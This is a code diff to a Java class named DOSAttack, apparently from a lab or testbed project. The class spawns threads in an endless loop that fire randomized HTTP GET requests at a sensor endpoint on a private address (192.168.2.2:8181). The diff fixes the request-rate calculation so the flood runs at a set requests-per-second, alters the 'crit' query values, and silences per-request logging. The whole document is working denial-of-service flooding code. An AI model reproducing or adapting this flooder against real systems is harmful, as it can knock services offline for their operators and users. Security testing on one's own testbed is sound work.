@@ -16,7 +16,9 @@ public class DOSAttack {
     Thread daemon;
     boolean flag = true;
     public DOSAttack(int mode,int rps) {
-        long sleepTime = 1/rps;
+        float buffer = 1000 * (1.0f/rps);
+        long sleepTime = (long) buffer;
+        System.out.println("Sending request every "+buffer+" ms");
         while (flag) {
             daemon = new Thread(new Runnable() {
                 @Override
@@ -25,12 +27,12 @@ public class DOSAttack {
                         Random rng = new Random();
                         String url = "";
                         if(mode == 1){
-                        url = "http://192.168.2.2:8181/sensor/" + (rng.nextInt(2) + 1) * 2 + "/temp?crit=" + (rng.nextInt(3) + 3);
+                        url = "http://192.168.2.2:8181/sensor/" + (rng.nextInt(2) + 1) * 2 + "/temp?crit=" + (rng.nextInt(4) + 1);
                         }
                         else{
                             url = "http://192.168.2.2:8181/sensor/"+(rng.nextInt(2)+1)*2+"/temp?crit=" + 4;
                         }
-                        System.out.println(url);
+                        //System.out.println(url);
                         HTTPRequest.sendGet(url);
 
                     } catch (Exception ex) {
